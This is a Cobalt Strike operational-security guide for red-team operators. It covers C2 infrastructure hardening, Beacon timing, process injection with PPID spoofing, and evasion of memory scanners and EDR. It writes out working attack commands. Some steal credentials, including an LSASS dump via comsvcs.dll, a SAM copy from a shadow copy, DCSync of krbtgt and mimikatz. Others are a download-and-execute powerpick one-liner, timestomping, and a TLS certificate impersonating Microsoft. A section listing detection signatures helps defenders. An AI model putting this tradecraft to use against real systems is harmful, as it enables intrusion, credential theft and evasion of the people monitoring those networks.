# Cobalt Strike — OPSEC Guide (English)

> Operational security for red team engagements using Cobalt Strike. Covers team server hardening, Beacon OPSEC, common detection signatures, and mistakes to avoid.

---

## Table of Contents

1. [OPSEC Principles](#1-opsec-principles)
2. [Team Server Hardening](#2-team-server-hardening)
3. [Beacon Sleep & Jitter Strategy](#3-beacon-sleep--jitter-strategy)
4. [Process Injection OPSEC](#4-process-injection-opsec)
5. [Network Traffic OPSEC](#5-network-traffic-opsec)
6. [Memory OPSEC](#6-memory-opsec)
7. [Credential OPSEC](#7-credential-opsec)
8. [Lateral Movement OPSEC](#8-lateral-movement-opsec)
9. [File & Disk OPSEC](#9-file--disk-opsec)
10. [Common Detection Signatures](#10-common-detection-signatures)
11. [Common OPSEC Mistakes](#11-common-opsec-mistakes)
12. [OPSEC Checklist](#12-opsec-checklist)

---

## 1. OPSEC Principles

### The OPSEC Loop (Applied to Red Teaming)

```
Identify critical information
       ↓
Analyze threats (Blue team capabilities)
       ↓
Analyze vulnerabilities (What you're doing that could be detected)
       ↓
Assess risk (Likelihood × Impact)
       ↓
Apply countermeasures (Profile, sleep, spawnto, etc.)
```

### Key Mindset

- **Assume MDR/XDR is watching** — modern blue teams have EDR telemetry, network flow analysis, and SIEM correlation.
- **Minimize footprint** — every action leaves a trace. Do only what the objective requires.
- **Match operational tempo to detection risk** — fast actions are louder. If stealth is paramount, slow down.
- **Compartmentalize** — use different listeners, domains, and infrastructure for each target. Never reuse C2 infrastructure.
- **Burn and rebuild** — when detected, abandon the compromised infrastructure entirely and start fresh.

---

## 2. Team Server Hardening

### Network Restrictions

```bash
# iptables: only allow connections from known operator IPs and target range
iptables -A INPUT -p tcp --dport 50050 -s 203.0.113.5 -j ACCEPT   # operator 1
iptables -A INPUT -p tcp --dport 50050 -s 203.0.113.6 -j ACCEPT   # operator 2
iptables -A INPUT -p tcp --dport 50050 -j DROP                     # block everyone else

# Allow Beacon callbacks only on C2 port
iptables -A INPUT -p tcp --dport 443 -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j DROP    # if not using HTTP listener
iptables -A INPUT -p udp --dport 53 -j ACCEPT  # DNS if using DNS listener
```

### SSH Hardening

```bash
# /etc/ssh/sshd_config
PermitRootLogin no
PasswordAuthentication no
AllowUsers operator1 operator2
```

### TLS Certificate — Not the Default

Never use the default Cobalt Strike TLS certificate. Replace it:

```bash
# Generate a proper cert (use a domain that matches your Malleable profile)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes \
  -subj "/C=US/ST=Washington/L=Redmond/O=Microsoft Corporation/CN=update.microsoft.com"

# Convert to keystore for CS
openssl pkcs12 -export -out cobaltstrike.store -inkey key.pem -in cert.pem -name cobaltstrike -passout pass:123456

# Update CS keystore
# (edit cobaltstrike.jar → modify cobaltstrike.store reference or use profile)
```

Better: buy a valid TLS cert for a domain you control.

### Redirectors

Never expose the Team Server directly. Always use redirectors:

```
Victim → Redirector (VPS/CDN) → Team Server
```

The redirector's IP is burned if discovered; the team server survives.

### Team Server Port Knocking

```bash
# Only open port 50050 after a secret knock sequence
apt install knockd
# /etc/knockd.conf:
[openSSH]
sequence    = 7000,8000,9000
seq_timeout = 5
command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 50050 -j ACCEPT
tcpflags    = syn

[closeSSH]
sequence    = 9000,8000,7000
seq_timeout = 5
command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 50050 -j ACCEPT
tcpflags    = syn
```

---

## 3. Beacon Sleep & Jitter Strategy

### Timing Zones

| Phase | Sleep | Jitter | Rationale |
|---|---|---|---|
| Initial access (fast lateral move needed) | 5–10 s | 20% | Short window to establish foothold |
| Established foothold (normal ops) | 60 s | 20–30% | Balance responsiveness vs. detection |
| Quiet persistence | 300–600 s | 50% | Minimize beacon frequency |
| Full stealth (long-term implant) | 3600 s | 50% | One callback per ~30–90 min |

### Jitter Calculation

```
actual_sleep = sleep * (1 ± jitter/100)
# sleep=60, jitter=30 → 42–78 seconds
# sleep=3600, jitter=50 → 1800–5400 seconds
```

### Changing Sleep Mid-Operation

```
beacon> sleep 0          # interactive — use only when actively working
# ... do your tasks ...
beacon> sleep 300 50     # go quiet when done
```

### DNS Beacon Sleep

DNS Beacon has a separate `dns_sleep` setting:

```
dns-beacon { set dns_sleep "5000"; }     # 5 seconds between DNS queries
```

Don't confuse with the main `sleeptime` — DNS sleep affects query frequency within a check-in cycle.

---

## 4. Process Injection OPSEC

### Choosing Injection Targets

**DO inject into:**
- Long-running, stable processes: `svchost.exe`, `explorer.exe`, `RuntimeBroker.exe`
- Processes that legitimately do network activity: `svchost.exe`, `dllhost.exe`
- Processes in the same session as your Beacon

**DON'T inject into:**
- `lsass.exe` — triggers AV alerts, heavy monitoring, requires SeDebugPrivilege
- Processes belonging to AV/EDR software
- Short-lived processes that will die soon
- Processes in different sessions (Session 0 vs. Session 1)

### Checking Process Session

```
beacon> ps
# Look at the Session column
# Match your session to inject into visible desktop processes
```

### Spawnto Selection

```
beacon> spawnto x64 C:\Windows\System32\dllhost.exe
beacon> spawnto x64 C:\Windows\System32\WerFault.exe     # Error reporting — rare, may alarm
beacon> spawnto x64 C:\Windows\System32\RuntimeBroker.exe # UWP broker — common, trusted
beacon> spawnto x64 C:\Windows\System32\backgroundTaskHost.exe # Background tasks

# Verify spawnto binary is legitimate
beacon> shell Get-FileHash C:\Windows\System32\dllhost.exe -Algorithm SHA256
```

### PPID Spoofing

Match the PPID to what makes sense for the spawnto binary:

```
# dllhost.exe is typically spawned by svchost.exe
beacon> ps     # find svchost.exe PID
beacon> ppid 4812   # svchost's PID
beacon> run whoami  # now spawns dllhost under svchost — looks legitimate
```

### blockdlls

```
beacon> blockdlls start
# Before any fork&run task (execute-assembly, mimikatz, etc.)
```

This blocks EDR's DLL injection into the sacrificial process, preventing it from seeing inside the process.

---

## 5. Network Traffic OPSEC

### Domain Selection

Good C2 domain criteria:
- **Aged** — registered > 1 year old (use domain aging services or buy used domains)
- **Categorized** — already categorized in Umbrella/BlueCoat as benign (technology, business, news)
- **Similar to target** — mirrors the target's technology stack
- **Valid certificate** — signed TLS cert, not self-signed

```bash
# Check domain age and categorization
whois <domain> | grep "Creation Date"
curl -s "https://api.securitytrails.com/v1/history/<domain>/dns/a"

# Check BlueCoat categorization
https://sitereview.bluecoat.com/
```

### C2 Redirectors — Apache mod_rewrite

Redirector forwards legitimate-looking traffic to the team server while returning 404 for everything else:

```apache
# /etc/apache2/sites-enabled/c2.conf
<VirtualHost *:443>
    ServerName update.microsoft-cdn.com
    SSLEngine on
    SSLCertificateFile    /etc/ssl/certs/cert.pem
    SSLCertificateKeyFile /etc/ssl/private/key.pem

    RewriteEngine On
    RewriteCond %{REQUEST_URI} ^/search$          [OR]
    RewriteCond %{REQUEST_URI} ^/collect$
    RewriteRule ^(.*)$ https://TEAMSERVER_IP:443$1 [P,L]

    # Default: serve real website or 404
    ProxyPass / http://legitimate-website.com/
    ProxyPassReverse / http://legitimate-website.com/
</VirtualHost>
```

### CDN Fronting

Route Beacon traffic through a CDN (Cloudflare, Azure CDN, Fastly):

```
Victim → CDN edge (Cloudflare IP) → Your backend server → Team Server
```

The SNI/Host header at the CDN can route to your backend. The victim only sees Cloudflare's IP range — very hard to block without collateral damage.

### DNS Security

For DNS C2:
- Use a domain with your own NS records
- Point NS to your DNS C2 server (Team Server acting as authoritative NS)
- Avoid `.top`, `.xyz`, `.tk` — heavily monitored TLDs

```bash
# Example DNS delegation:
# Register: c2domain.com
# NS1: ns1.c2domain.com → your team server IP
# ns1.c2domain.com → A record → your team server IP
```

---

## 6. Memory OPSEC

### Beacon In-Memory Signatures

Default Cobalt Strike Beacon has known signatures that memory scanners detect:

```
# Known strings in unpatched Beacon:
"ReflectiveLoader"
"beacon.dll"
"%02d/%02d/%02d %02d:%02d:%02d"
"MZARUH"    # default MZ header variant
"%d is an x64 Beacon"
```

Mitigate with Malleable C2 profile `stage` block:
```
stage {
    set stomppe    "true";
    set obfuscate  "true";
    set userwx     "false";
    set sleep_mask "true";
    set cleanup    "true";
    set stackspoof "true";    # CS 4.5+
}
```

### Detecting Memory-Based Tools

Detection tools that blue teams use:

| Tool | What It Detects |
|---|---|
| `pe-sieve` | PE anomalies in process memory |
| `moneta` | Private memory with executable code |
| `BeaconHunter` | Cobalt Strike beacon signatures |
| `hunt-sleeping-beacons` | Beacons in sleep state |
| `MalMemDetect` | Shellcode heuristics |

### Sleep Mask

The sleep mask encrypts Beacon's heap and code sections while sleeping, making memory scanner evasion much more effective. Enable in profile:

```
stage { set sleep_mask "true"; }
```

### Stack Spoofing (CS 4.5+)

Call stack spoofing inserts fake return addresses to hide Beacon's call stack during sleep:

```
stage { set stackspoof "true"; }
```

---

## 7. Credential OPSEC

### Avoid Touching lsass.exe Directly

`procdump`, direct LSASS handle access, and `MiniDumpWriteDump` all generate EDR alerts.

**Preferred alternatives:**
```
# 1. Nanodump BOF (indirect access via handle duplication)
beacon> inline-execute /opt/bofs/nanodump.o lsass 1

# 2. Task Manager method (GUI if interactive)
# 3. comsvcs.dll (LOLBin dump)
beacon> shell rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsass_PID> C:\Temp\lsass.dmp full

# 4. Shadow copy (no direct access)
beacon> shell wmic shadowcopy call create Volume=C:\
beacon> shell copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM" C:\Temp\SAM
```

### DCSync Instead of Hashdump

For domain accounts, prefer DCSync over LSASS dumping — it's a replication protocol call, not memory reading:

```
beacon> dcsync corp.local CORP\administrator
beacon> dcsync corp.local CORP\krbtgt
```

### Clearing Credential Artifacts

```
# Clear cached credentials after use
beacon> mimikatz sekurlsa::logonpasswords     # always do in fork&run (default)
# Don't run mimikatz in the Beacon process itself
```

---

## 8. Lateral Movement OPSEC

### Movement Method Risk Matrix

| Method | Noisiness | Notes |
|---|---|---|
| `jump psexec` | High | Creates a service — logged in System event log (7045) |
| `jump psexec_psh` | High | PowerShell service — PS logs may trigger |
| `jump winrm64` | Medium | WinRM is expected in managed environments |
| `jump wmi` | Medium-Low | WMI is common; no service creation |
| `jump smb` (named pipe) | Low | No new network connection from victim |
| Token + pass-the-hash | Low | No explicit service/connection |
| DCOM lateral movement | Low | Normal COM activity |

### Minimizing Service Creation

```
# psexec creates a service that gets logged
# Use winrm or wmi instead when possible:
beacon> jump winrm64 target.corp.local lab-https
beacon> jump wmi64 target.corp.local lab-https
```

### Named Pipe Pivoting (Stealthiest)

```
# No new external connection from the pivot host
beacon> jump psexec internal-host smb-listener   # internal-host → team server via Beacon
```

### Timing Lateral Movement

- Don't move laterally during off-hours if suspicious activity alerts fire outside business hours.
- Match movement cadence to normal admin activity on the target network.

---

## 9. File & Disk OPSEC

### Avoid Dropping Files

Prefer in-memory execution:
```
beacon> execute-assembly /opt/tools/Rubeus.exe        # in memory
beacon> inline-execute /opt/bofs/tool.o              # in memory
beacon> powerpick IEX (New-Object Net.WebClient).DownloadString('...')   # in memory
```

### If You Must Drop Files

```
# Use staging locations that blend in:
C:\Windows\Temp\              # common temp, frequently wiped
C:\ProgramData\Microsoft\     # looks legitimate
C:\Users\<user>\AppData\Local\Temp\    # user temp
C:\Windows\System32\spool\PRINTERS\   # rarely monitored

# Name files like legitimate Windows binaries:
MicrosoftEdgeUpdate.exe
WerFault.exe
RuntimeBroker.exe
dllhost.exe
svchost.exe    # BE CAREFUL — very monitored

# Always timestomp:
beacon> timestomp C:\Windows\System32\calc.exe C:\Temp\payload.exe
```

### Cleaning Up

```
beacon> rm C:\Temp\payload.exe
beacon> rm C:\Temp\output.txt
# For large dumps, exfiltrate then delete:
beacon> download C:\Temp\lsass.dmp
beacon> rm C:\Temp\lsass.dmp
```

---

## 10. Common Detection Signatures

### Network Signatures

| Signature | Indicator |
|---|---|
| Default CS user-agent | `Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)` |
| Default CS certificate | JA3 hash of default CS TLS cert |
| Regular beacon interval | Packets arriving at perfectly regular intervals |
| Default CS URIs | `/dpixel`, `/__utm.gif`, `/submit.php`, `/ca` |
| Metadata in Cookie | `AAAA`-based base64 cookie value |

### Host-Based Signatures

| Signature | Indicator |
|---|---|
| Named pipe creation | `\\.\pipe\MSSE-*-server`, default CS pipe names |
| Default spawnto | `rundll32.exe` spawned without arguments |
| Memory: RWX regions | Unsigned private memory with RWX permissions |
| Memory: Cobalt Strike strings | `beacon.dll`, `ReflectiveLoader` in process memory |
| Token impersonation | Frequent `OpenProcessToken` + `DuplicateToken` calls |

### OPSEC Mitigations for Each Signature

```
# Default user-agent → set custom UA in profile:
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36...";

# Default cert → use real cert or custom keystore

# Regular intervals → always set jitter:
set jitter "20";

# Default URIs → set custom URIs in http-get/http-post:
set uri "/search";

# Metadata in Cookie → use parameter or custom header instead:
metadata { base64url; parameter "q"; }

# Named pipes → set custom pipe names:
set pipename "wkssvc##";
set pipename_stager "mojo.##";

# Default spawnto → always set spawnto:
set spawnto_x64 "%windir%\\system32\\dllhost.exe";

# RWX memory → userwx false:
stage { set userwx "false"; }

# CS strings → stomppe + cleanup + strrep:
stage { set stomppe "true"; set cleanup "true"; strrep "beacon.dll" ""; }
```

---

## 11. Common OPSEC Mistakes

### Mistake 1: Using Sleep 0 for Too Long

```
# BAD: interactive mode left running overnight
beacon> sleep 0
# ... operator forgets ...
# Next morning: EDR alert for 8 hours of continuous C2 traffic

# GOOD: use interactive briefly, then go quiet
beacon> sleep 0
# ... do tasks quickly ...
beacon> sleep 300 50
```

### Mistake 2: Default Profile

Never use the default Cobalt Strike profile. The default:
- Has known HTTP URIs (`/submit.php`, `/__utm.gif`)
- Has a known user-agent
- Has a known TLS fingerprint (JA3)
- Has known named pipe names

Always load a custom Malleable C2 profile.

### Mistake 3: Injecting into lsass.exe

```
# BAD
beacon> inject 584 x64 lab-https    # if 584 is lsass.exe

# GOOD: dump credentials without injecting
beacon> logonpasswords              # uses fork&run — sacrificial process reads LSASS
```

### Mistake 4: Running Mimikatz in Beacon Process

```
# BAD: mimikatz runs inside Beacon's own process
beacon> mimikatz sekurlsa::logonpasswords    # actually this uses fork&run, so it's OK
# But custom inline execution in Beacon process is risky:
beacon> inline-execute mimikatz.o           # if Beacon crashes, session dies
```

### Mistake 5: Reusing C2 Infrastructure

Each engagement should have fresh:
- Team server IP
- Domain names
- TLS certificates
- Profile URIs

If a domain gets burned in one engagement, it's on threat intelligence feeds.

### Mistake 6: Not Cleaning Up

```
# After hashdump:
beacon> rm C:\Windows\Temp\<dump_file>    # hashdump doesn't drop files, but custom tools might

# After lateral movement:
# psexec leaves service artifacts
beacon> shell sc delete "CreatedServiceName"

# After file uploads:
beacon> rm C:\Temp\uploaded_tool.exe
```

### Mistake 7: Spawning powershell.exe

```
# BAD: powershell.exe visible in process list
beacon> powershell Get-ADUser -Filter *

# GOOD: powerpick uses unmanaged PowerShell without spawning powershell.exe
beacon> powerpick Get-ADUser -Filter *
```

### Mistake 8: Large Data Transfers During Business Hours

Large file downloads (NTDS.dit, memory dumps) generate significant network traffic and may trigger DLP policies. Schedule during normal business hours when large transfers are expected.

---

## 12. OPSEC Checklist

### Pre-Engagement

- [ ] Custom Malleable C2 profile loaded and tested with `c2lint`
- [ ] Team server behind redirector(s)
- [ ] iptables rules restricting team server access
- [ ] Custom TLS certificate (not default CS cert)
- [ ] Aged, categorized domain for C2
- [ ] Custom named pipe names in profile
- [ ] `spawnto` set to legitimate binary
- [ ] `sleep_mask`, `stomppe`, `userwx false` in stage block
- [ ] Test Beacon against target AV/EDR in isolated lab

### Per-Beacon

- [ ] Set sleep to appropriate value (not 0 unless active)
- [ ] Set jitter (minimum 15%)
- [ ] Set `spawnto` appropriate for target environment
- [ ] Set `ppid` to a legitimate parent process
- [ ] Enable `blockdlls` before fork&run operations
- [ ] Note the Beacon for easy identification

### Pre-Action

- [ ] Confirm current token context (`getuid`)
- [ ] Identify target processes for injection (`ps`)
- [ ] Check if EDR/AV products running (`ps`)
- [ ] Confirm sleep interval is appropriate for operation noise level

### Post-Action

- [ ] Clean up dropped files
- [ ] Remove persistence if not needed
- [ ] Return sleep to quiet value
- [ ] Rev2self to drop impersonated tokens
- [ ] Document actions in team chat

---

*Last updated: 2026-06-09 | Reference for authorized red team use only.*
